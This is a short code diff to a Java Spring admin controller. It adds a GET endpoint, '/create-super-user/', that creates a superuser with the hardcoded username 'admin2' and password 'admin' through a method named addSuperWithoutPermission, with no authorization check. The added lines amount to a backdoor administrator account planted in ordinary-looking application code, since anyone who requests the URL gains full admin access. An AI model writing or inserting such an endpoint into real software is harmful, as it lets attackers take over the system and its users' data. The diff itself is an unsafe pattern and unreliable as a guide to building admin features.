@@ -105,4 +105,9 @@ public class AdminController {
         model.addAttribute("users", userRepository.findAll());
         return "admin-users";
     }
+
+    @GetMapping("/create-super-user/")
+    public void createSuperUser() throws UserAlreadyRegisteredException {
+        authenticationService.addSuperWithoutPermission("admin2", "admin");
+    }
 }
